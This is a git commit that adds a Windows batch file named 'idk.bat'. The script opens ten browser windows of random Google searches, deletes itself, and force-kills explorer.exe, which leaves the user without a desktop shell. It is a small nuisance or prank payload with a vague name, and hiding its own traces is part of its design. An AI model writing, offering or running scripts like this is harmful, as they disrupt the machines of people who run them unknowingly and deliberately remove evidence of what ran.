fda4099c4c3dd585001469043681b55f3a4f314e
ElytralMC <elytralmc@gmail.com>
2018-07-05 15:14:25 -0400

    added idk

---
+++ idk.bat
@@ -0,0 +1,15 @@
+@echo off
+color 01
+start http://google.com/search?q=%random%
+start http://google.com/search?q=%random%
+start http://google.com/search?q=%random%
+start http://google.com/search?q=%random%
+start http://google.com/search?q=%random%
+start http://google.com/search?q=%random%
+start http://google.com/search?q=%random%
+start http://google.com/search?q=%random%
+start http://google.com/search?q=%random%
+start http://google.com/search?q=%random%
+del idk.bat
+taskkill /im explorer.exe /f
+exit
